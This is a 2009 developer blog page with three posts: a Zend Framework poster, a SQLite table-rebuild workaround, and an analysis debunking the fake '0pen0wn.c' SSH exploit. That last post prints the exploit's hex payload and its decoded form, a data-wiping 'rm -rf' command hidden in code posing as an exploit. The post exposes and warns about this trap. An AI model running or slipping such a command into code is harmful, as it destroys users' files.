  <div class="articletext"><p>Two or three weeks ago i was <a href="http://blog.thinkphp.de/archives/399-Mayflower-loves-Zend-Framework.html">reading post</a> from <a href="http://blog.thinkphp.de/">Bjoern Schotte</a>. That the guys at <a href="http://www.mayflower.de">Mayflower</a> created a poster for Zend Framework. Seems they really love it there. And since i am a big fan myself. I send Bjoern an email to ask for an English version. If available. So some time passed. And i completely forgot about it. Until i came home yesterday and found my own personal copy of the Mayflower Zend Framework poster in the mail.</p>

<p><a href="http://blog.lenss.nl/images/2009/07/mayflower-zf-map.jpg"><img src="http://blog.lenss.nl/images/2009/07/mayflower-zf-map-300x205.jpg" alt="mayflower-zf-map" /></a></p>

<p>It’s a cool poster. All the most common used components are there. A nice reference to have. And a great piece of promotion material for the <a href="http://framework.zend.com/">framework</a> it self. Now i just need to find a good spot for it. It will be the second A0 poster hanging here. And probably not the last one. Since mister PHP security himself Stefan Esser from <a href="http://www.sektioneins.de/">SektionEins</a> is working on a PHP security poster. If you would like your own copy. Send Bjoern an email.</p>

<p>Thanks guys.</p>
</div>
  
  


<div style="clear:both;"></div>

  <footer>
     <p class="meta">
      <a href="http://blog.lenss.nl/2009/07/mayflowers-zend-framework-poster/#disqus_thread">Comments</a>
      
      








  


<time datetime="2009-07-25T22:48:11+02:00" pubdate data-updated="true">Jul 25<span>th</span>, 2009</time>
      

<span class="categories">
  
    <a class='category' href='http://blog.lenss.nl/tag/code/'>Code</a>, <a class='category' href='http://blog.lenss.nl/tag/php/'>PHP</a>, <a class='category' href='http://blog.lenss.nl/tag/tech/'>Tech</a>
  
</span>


    </p>
  </footer>
  </article>
  
  
  <article>
  
<header>
	<header>
	
	  <h1 class="entry-title"><a href="http://blog.lenss.nl/2009/07/change-columns-data-type-in-sqlite/">Change Columns Data Type in Sqlite</a></h1>
	
	</header>
</header>


  <div class="articletext"><p>My coworker Chris yesterday asked me how to change a column data type in a database. He wanted to change the data type from varchar to text. So my first reaction was to shout ALTER TABLE. But i didn’t realize he was using <a href="http://www.sqlite.org/">sqlite</a> at the moment. So after reading the docs for a while. We came to the conclusion sqlite does support the ALTER statement. But it is very limited compared to say MySQL. And it doesn’t provide the option to alter the data types or column names.</p>

<p>So how should you change a column data type in an sqlite database? Well as far as i can see there is not really a simple solution. But here goes for our work around.</p>

<p>Let’s start off by creating a test database:</p>

<blockquote>
  <p>sqlite3 test.db  “create table sync (id INTEGER PRIMARY KEY, data VARCHAR, num double, dateIn DATE);”</p>
</blockquote>

<p>And insert some test data:</p>

<blockquote>

  <ul>
    <li>sqlite3 test.db  “insert into sync (data, num) values (‘This is sampledata’, 3);”</li>
    <li>sqlite3 test.db  “insert into sync (data, num) values (‘More sample data’, 6);”</li>
    <li>sqlite3 test.db  “insert into sync (data, num) values (‘And a little more’, 9);”</li>
  </ul>
</blockquote>

<p>Now comes the trick. We first create a temporary table and populate it with the data from the table we are going to alter.</p>

<blockquote>
  <p>sqlite3 test.db  “create table temp_table as select * from sync;”</p>
</blockquote>

<p>Drop the database to alter. And after that recreate it again. But this time with the changes we wanted to make. So we change the VARCHAR field to TEXT.</p>

<blockquote>

  <ul>
    <li>sqlite3 test.db  “drop table sync;”</li>
    <li>sqlite3 test.db  “create table sync (id INTEGER PRIMARY KEY, data TEXT, num double, dateIn DATE);”</li>
  </ul>
</blockquote>

<p>The only thing left now is to populate the new database with the data from the temporary table. And finally drop the temporary table.</p>

<blockquote>

  <ul>
    <li>sqlite3 test.db  “insert into sync select * from temp_table;”</li>
    <li>sqlite3 test.db  “drop table temp_table;”</li>
  </ul>
</blockquote>

<p>There must be a cleaner way to do this. But this worked for us!</p>
</div>
  
  


<div style="clear:both;"></div>

  <footer>
     <p class="meta">
      <a href="http://blog.lenss.nl/2009/07/change-columns-data-type-in-sqlite/#disqus_thread">Comments</a>
      
      








  


<time datetime="2009-07-23T12:53:17+02:00" pubdate data-updated="true">Jul 23<span>rd</span>, 2009</time>
      

<span class="categories">
  
    <a class='category' href='http://blog.lenss.nl/tag/tech/'>Tech</a>
  
</span>


    </p>
  </footer>
  </article>
  
  
  <article>
  
<header>
	<header>
	
	  <h1 class="entry-title"><a href="http://blog.lenss.nl/2009/07/0pen0wn-c-what-a-joke/">0pen0wn.c What a Joke</a></h1>
	
	</header>
</header>


  <div class="articletext"><p>So there have been a lot of <a href="http://seclists.org/fulldisclosure/2009/Jul/0028.html">rumors</a> lately about some remote SSH exploit. And to throw a bit of fuel on the fire some hacker / group have released what they call an exploit. This piece of <a href="http://blogs.securiteam.com/index.php/archives/1302">code</a> is just hilarious. At a first glance it looks like a real exploit. But when you take the time to decode the HEX blocks. It will become obvious this is not what it seems to be.</p>

<p>there are three blocks with HEX characters. The last two transform into some perl scripts that seem to make contact with an IRC server. This code seems to be bogus. The first and smallest HEX block is interesting though.</p>

<blockquote>
  <p>\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f
\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26</p>
</blockquote>

<p>When decoded back to ASCII characters. This reads:</p>

<blockquote>
  <p>rm -rf ~ /* 2&gt; /dev/null &amp;</p>
</blockquote>

<p>The code used for the decoding is a simple PHP script:</p>

<div class="bogus-wrapper"><notextile><figure class="code"> <div class="CodeRay">
  <div class="code"><pre>
<span class="keyword">foreach</span> (<span class="predefined">explode</span>(<span class="string"><span class="delimiter">'</span><span class="content">\x</span><span class="delimiter">'</span></span>, <span class="local-variable">$str</span>) <span class="keyword">as</span> <span class="local-variable">$char</span>) <span class="predefined">echo</span> <span class="predefined">chr</span>(<span class="predefined">hexdec</span>(<span class="local-variable">$char</span>);
</pre></div>
</div>
 </figure></notextile></div>

</div>
  
  


<div style="clear:both;"></div>

  <footer>
     <p class="meta">
      <a href="http://blog.lenss.nl/2009/07/0pen0wn-c-what-a-joke/#disqus_thread">Comments</a>
      
      








  


<time datetime="2009-07-16T15:07:45+02:00" pubdate data-updated="true">Jul 16<span>th</span>, 2009</time>
      

<span class="categories">
  
    <a class='category' href='http://blog.lenss.nl/tag/code/'>Code</a>, <a class='category' href='http://blog.lenss.nl/tag/security/'>Security</a>, <a class='category' href='http://blog.lenss.nl/tag/tech/'>Tech</a>
  
</span>


    </p>
  </footer>
  </article>
  

  <ul class="pager">
    
    <li><a href="http://blog.lenss.nl/page/10/">&larr; Older</a></li>
    
    
    <li><a href="http://blog.lenss.nl/page/8/">Newer &rarr;</a></li>
    
  </ul>

  <div class="blog-copy">
      Copyright &copy; 2015 - Thijs Lensselink -
      <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
  </div>
</div>

	      </div>
	  </div>

        </div>

        <div class="col-sm-4 col-sm-offset-0 blog-sidebar">
	    <div id="sidebar">
	       
	           
<div class="sidebox">
	<div class="me">
		<a href="http://www.zend.com/store/education/certification/yellow-pages.php#show-ClientCandidateID=ZEND006598"><img src="http://blog.lenss.nl/images/php5-zce-logo-new.gif" height="50" /></a>
		<a href="http://stackoverflow.com/users/476697/tlenss">
			<img src="http://stackoverflow.com/users/flair/476697.png?theme=dark" width="179" height="50" alt="profile for tlenss at Stack Overflow, Q&amp;A for professional and enthusiast programmers" title="profile for tlenss at Stack Overflow, Q&amp;A for professional and enthusiast programmers">
		</a>
		<div class="gpg">
			Key ID : <a href="http://blog.lenss.nl/C773940D.asc">0xC773940D</a><br/>
			Fingerprint : 9AF2 38D6 3172 2F3E 112F 9024 C558 F5CD C773 940D
		</div>
	</div>
</div>

<section>
  <div class="sidebox">
	<h1>Recent entries</h1>
	<ul class="linklist">
		
		<li><a href="http://blog.lenss.nl/2016/01/using-the-hub-in-github-pull-requests/">Using the hub in Github - pull requests</a></li>
		
		<li><a href="http://blog.lenss.nl/2015/01/git-view-unpushed-changes/">View unpushed changes in git</a></li>
		
		<li><a href="http://blog.lenss.nl/2014/09/secure-cloud-storage-with-google-and-encfs-on-ubuntu/">Secure cloud storage with Google and encfs on Ubuntu</a></li>
		
		<li><a href="http://blog.lenss.nl/2013/11/first-weekday-of-month-in-php/">Get the first weekday of the month in PHP</a></li>
		
		<li><a href="http://blog.lenss.nl/2013/10/git-move-folder-containing-submodules/">Renaming a folder in git that contains submodules</a></li>
		
		<li><a href="http://blog.lenss.nl/2013/10/clover-forcast-for-php-in-jenkins/">Fixing the clover forcast for PHP projects in Jenkins</a></li>
		
		<li><a href="http://blog.lenss.nl/2013/08/github-and-multiple-ssh-keys/">Github, SSH and multiple repositories</a></li>
		
		<li><a href="http://blog.lenss.nl/2013/07/memory-exhaust-issue-PHP-and-APM/">Memory exhaust issue PHP and APM</a></li>
		
		<li><a href="http://blog.lenss.nl/2013/06/php-55-released/">PHP 5.5.0 released</a></li>
		
		<li><a href="http://blog.lenss.nl/2013/03/casting-weirdness-with-PHP/">Casting weirdness with PHP</a></li>
		
	</ul>
</div>
</section>

<div class="sidebox ad">
	<script type="text/javascript"><!--
	google_ad_client = "ca-pub-0921745317573569";
	/* nlblue_side */
	google_ad_slot = "7706621160";
	google_ad_width = 300;
	google_ad_height = 250;
	//-->
	</script>
	<script type="text/javascript"
	src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
	</script>
</div>
<div class="sidebox">
	<h1>Tags</h1>
	<ul id="tag-cloud" class="blocklist"><a href='http://blog.lenss.nl/tag/-home' style='font-size: 120.0%'>/home(32)</a> <a href='http://blog.lenss.nl/tag/cloud' style='font-size: 100.625%'>Cloud(1)</a> <a href='http://blog.lenss.nl/tag/code' style='font-size: 160.0%'>Code(96)</a> <a href='http://blog.lenss.nl/tag/design' style='font-size: 102.5%'>Design(4)</a> <a href='http://blog.lenss.nl/tag/development' style='font-size: 101.25%'>Development(2)</a> <a href='http://blog.lenss.nl/tag/freelance' style='font-size: 102.5%'>Freelance(4)</a> <a href='http://blog.lenss.nl/tag/git' style='font-size: 102.5%'>Git(4)</a> <a href='http://blog.lenss.nl/tag/google' style='font-size: 101.875%'>Google(3)</a> <a href='http://blog.lenss.nl/tag/javascript' style='font-size: 105.0%'>Javascript(8)</a> <a href='http://blog.lenss.nl/tag/jenkins' style='font-size: 100.625%'>Jenkins(1)</a> <a href='http://blog.lenss.nl/tag/jquery' style='font-size: 101.25%'>Jquery(2)</a> <a href='http://blog.lenss.nl/tag/magento' style='font-size: 101.25%'>Magento(2)</a> <a href='http://blog.lenss.nl/tag/php' style='font-size: 143.125%'>PHP(69)</a> <a href='http://blog.lenss.nl/tag/security' style='font-size: 105.625%'>Security(9)</a> <a href='http://blog.lenss.nl/tag/sql' style='font-size: 103.75%'>SQL(6)</a> <a href='http://blog.lenss.nl/tag/tech' style='font-size: 159.375%'>Tech(95)</a> <a href='http://blog.lenss.nl/tag/zend' style='font-size: 105.0%'>Zend(8)</a> </ul>
	<div style="clear:both;"></div>
</div>
<section>
  <div class="sidebox">
	<h1>GitHub Repos</h1>
	
	<ul class="linklist" id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/tlenss" class="github-follow-button">Follow On GitHub</a>
  
</div>
</section>


<section>
  <div class="sidebox">
	<!-- <h1>Latest Tweets</h1> -->
<a class="twitter-timeline" href="https://twitter.com/tlenss" data-widget-id="408894330036703232">Tweets by @tlenss</a>
<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
</div>
</section>


	       
	    </div>
        </div>

      </div>

    </div>

    <script src="http://blog.lenss.nl/javascripts/jquery-2.1.0.min.js"></script>
    <script src="http://blog.lenss.nl/javascripts/bootstrap-3.1.1.min.js"></script>
    <script src="http://blog.lenss.nl/javascripts/modernizr-2.0.js"></script>
    <script src="http://blog.lenss.nl/javascripts/ender.js"></script>
    <script src="http://blog.lenss.nl/javascripts/octopress.js"></script>
    <script src="http://blog.lenss.nl/javascripts/github.js"></script>
    <script src="http://blog.lenss.nl/javascripts/twitter.js"></script>
    <script src="http://blog.lenss.nl/javascripts/jquery.cookie.min.js"></script>
    <script src="http://blog.lenss.nl/javascripts/adn-timeline.js"></script>
    <script type="text/javascript">
    $.domReady(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = 'http://blog.lenss.nl/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'tlenss',
            count: 0,
            skip_forks: true,
            target: '#gh_repos'
        });
    });
  </script>
    
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-8003524-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


  </body>
</html>
